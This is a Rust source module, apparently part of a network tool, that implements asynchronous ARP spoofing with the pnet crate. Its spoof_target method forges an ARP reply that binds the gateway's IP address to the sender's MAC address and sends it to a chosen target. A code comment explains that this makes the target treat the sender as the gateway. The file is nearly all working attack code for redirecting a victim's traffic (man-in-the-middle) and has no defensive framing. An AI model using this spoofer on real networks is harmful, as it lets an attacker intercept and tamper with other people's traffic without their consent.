use std::{sync::{Arc, Mutex}, time::Duration};

use async_trait::async_trait;

use pnet::{packet::ethernet::EtherTypes, datalink::{self, NetworkInterface, Channel, DataLinkSender, DataLinkReceiver}};
use tokio::{task, time::timeout};

use crate::arp::packet_builder::{ArpPacketBuilderImpl, ArpPacketBuilder};

use super::network_location::NetworkLocation;

#[async_trait]
pub trait AsyncArpSpoofer {
    async fn spoof_target(&mut self, target: NetworkLocation) -> bool;
}

pub struct AsyncArpSpooferImpl {
    _impl: Arc<Mutex<ArpSpooferImpl>>,
}

impl AsyncArpSpooferImpl {
    pub fn new(interface: NetworkInterface,
        inspector: NetworkLocation, 
        gateway: NetworkLocation
    ) -> Self {
        return Self {
            _impl: Arc::from(Mutex::new(ArpSpooferImpl::new(interface, inspector, gateway))),
        }
    }
}

#[async_trait]
impl AsyncArpSpoofer for AsyncArpSpooferImpl {
    async fn spoof_target(&mut self, target: NetworkLocation) -> bool {
        let executor = self._impl.clone();
        let future = task::spawn_blocking(move || {
            let lock = executor.lock();
            let mut executor = lock.unwrap();
            let result = executor.spoof_target(target);
            return result;
        });

        let timeout = timeout(Duration::from_millis(3000), future);

        let join_handle = tokio::spawn(timeout);

        let value = join_handle.await;

        let result = value.unwrap();

        if let Ok(result) = result {
            return result.unwrap();
        } else {
            return false;
        }
    }
}

pub struct ArpSpooferImpl {
    interface: NetworkInterface,
    inspector: NetworkLocation,
    gateway: NetworkLocation,

    sender: Option<Box<dyn DataLinkSender>>,
    receiver: Option<Box<dyn DataLinkReceiver>>
}

impl ArpSpooferImpl {
    pub fn new(
        interface: NetworkInterface,
        inspector: NetworkLocation, 
        gateway: NetworkLocation,
    ) -> Self {
        let mut result = Self {
            interface: interface,
            inspector: inspector,
            gateway: gateway,
            sender: None,
            receiver: None,
        };

        result.setup_socket();

        return result;
    }

    fn setup_socket(&mut self) {
        let (tx, rx) = match datalink::channel(&self.interface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!("An error occurred when creating the datalink channel: {}", e)
        };

        self.sender = Some(tx);
        self.receiver = Some(rx);
    }

    fn spoof_target(&mut self, target: NetworkLocation) -> bool {
        // instantiate packet

        // Arp spoofing works by faking the gateway's Mac Address so the target thinks
        // we're the gateway.
        let spoofed_sender = NetworkLocation {
            ipv4: self.gateway.ipv4,
            hw: self.inspector.hw
        };

        let builder = ArpPacketBuilderImpl::new();
        
        let arp_response = builder.build_response(spoofed_sender, target);
        let ethernet_packet = builder.wrap_in_ethernet(self.inspector.hw, target.hw, EtherTypes::Arp, arp_response); 

        println!("Assembled packets!");
        println!("Preparing to send packet!");

        if let Some(sender) = self.sender.as_mut() {
            let send_opt = sender.send_to(&ethernet_packet, None);

                if let Some(send_res) = send_opt {
                    if let Ok(_) = send_res {
                        println!("Sent packet successfully!");
                        return true
                    } else {
                        println!("Failed on second part!");
                    }
        
                } else {
                    println!("Failed on first part!");
                }   
        }

        return false;
    }
}